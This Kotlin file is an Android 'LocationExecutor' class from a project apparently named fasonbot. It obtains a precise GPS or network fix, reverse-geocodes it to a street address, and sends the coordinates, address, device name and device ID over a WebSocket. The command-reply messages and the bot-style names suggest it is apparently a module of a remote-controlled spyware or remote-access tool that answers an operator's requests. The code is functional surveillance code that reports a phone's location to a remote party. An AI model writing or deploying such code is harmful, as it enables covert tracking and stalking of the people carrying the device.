package com.fasonbot.app.action

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.service.CoreService
import com.fasonbot.app.ws.WebSocketSender
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class LocationExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "LocationExecutor"
        private const val TIMEOUT_MS = 30000L
    }

    private val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)
    private val systemLocationMgr: android.location.LocationManager =
        context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val deviceId: String by lazy { DeviceManager.getDeviceId(context) }

    private var lastLocation: Location? = null
    private var activeCallback: LocationCallback? = null

    init { fetchLastLocation() }

    private fun hasPermission() =
        checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) || checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)

    private fun checkPermission(p: String) =
        ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED

    private fun fetchLastLocation() {
        if (!hasPermission()) return
        try {
            fusedClient.lastLocation
                .addOnSuccessListener { if (it != null) lastLocation = it else fallbackLocation() }
                .addOnFailureListener { fallbackLocation() }
        } catch (_: SecurityException) { fallbackLocation() }
    }

    private fun fallbackLocation() {
        try {
            listOf(android.location.LocationManager.NETWORK_PROVIDER, android.location.LocationManager.GPS_PROVIDER)
                .forEach { provider ->
                    if (systemLocationMgr.isProviderEnabled(provider)) {
                        systemLocationMgr.getLastKnownLocation(provider)?.let { lastLocation = it; return }
                    }
                }
        } catch (e: SecurityException) { Log.e(TAG, "Fallback error: ${e.message}") }
    }

    fun getCurrentLocation() {
        if (!hasPermission()) { sendResponse("Location permission not granted"); return }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            CoreService.getInstance()?.updateServiceType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        }

        lastLocation?.let { if (System.currentTimeMillis() - it.time < 60000) { sendLocation(it); return } }
        requestSingleLocation()
    }

    private fun requestSingleLocation() {
        if (!hasPermission()) { sendResponse("No location permission"); return }
        sendResponse("Getting location, please wait...")

        try {
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000).setWaitForAccurateLocation(true).setMaxUpdates(1).build()

            activeCallback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    result.lastLocation?.let { lastLocation = it; sendLocation(it) }
                        ?: run { fallbackLocation(); lastLocation?.let { sendLocation(it) } ?: sendResponse("Could not determine location") }
                    cleanup()
                }
            }
            fusedClient.requestLocationUpdates(req, activeCallback!!, Looper.getMainLooper())
            android.os.Handler(Looper.getMainLooper()).postDelayed({ handleTimeout() }, TIMEOUT_MS)

        } catch (e: SecurityException) {
            sendResponse("Location access denied: ${e.message}"); cleanup()
        } catch (e: Exception) {
            try {
                val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                    .setMinUpdateIntervalMillis(5000).setMaxUpdates(1).build()
                activeCallback = object : LocationCallback() {
                    override fun onLocationResult(result: LocationResult) {
                        result.lastLocation?.let { lastLocation = it; sendLocation(it) }
                            ?: sendResponse("Could not determine location")
                        cleanup()
                    }
                }
                fusedClient.requestLocationUpdates(req, activeCallback!!, Looper.getMainLooper())
            } catch (e2: Exception) { sendResponse("Location error: ${e2.message}"); cleanup() }
        }
    }

    private fun handleTimeout() {
        try {
            activeCallback?.let { fusedClient.removeLocationUpdates(it) }
            if (lastLocation == null) {
                fallbackLocation()
                lastLocation?.let { sendLocation(it) } ?: sendResponse("Location timeout - try again in open area")
            }
        } catch (e: Exception) { Log.e(TAG, "Timeout: ${e.message}") }
        cleanup()
    }

    private fun cleanup() {
        activeCallback = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            CoreService.getInstance()?.releaseServiceType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        }
    }

    private fun sendLocation(location: Location) {
        val lat = location.latitude
        val lng = location.longitude
        val accuracy = location.accuracy
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(location.time))

        var addressText = ""
        try {
            val geocoder = Geocoder(context, Locale.getDefault())
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                geocoder.getFromLocation(lat, lng, 1)?.firstOrNull()?.let { addressText = formatAddress(it) }
            } else {
                @Suppress("DEPRECATION")
                geocoder.getFromLocation(lat, lng, 1)?.firstOrNull()?.let { addressText = formatAddress(it) }
            }
        } catch (e: Exception) { Log.w(TAG, "Geocoding: ${e.message}") }

        val caption = buildString {
            append("📍 ${BotConfig.getDeviceName()} | $deviceId\n")
            append("🎯 Accuracy: ${String.format("%.1f", accuracy)}m\n")
            append("📅 $timestamp")
            if (addressText.isNotEmpty()) append("\n📍 $addressText")
        }

        WebSocketSender.sendLocation(lat, lng, caption)
    }

    private fun formatAddress(address: Address): String {
        return address.getAddressLine(0)
            ?: listOfNotNull(address.locality, address.adminArea, address.countryName).joinToString(", ")
    }

    fun shutdown() { try { activeCallback?.let { fusedClient.removeLocationUpdates(it) } } catch (_: Exception) {}; executor.shutdown() }
}
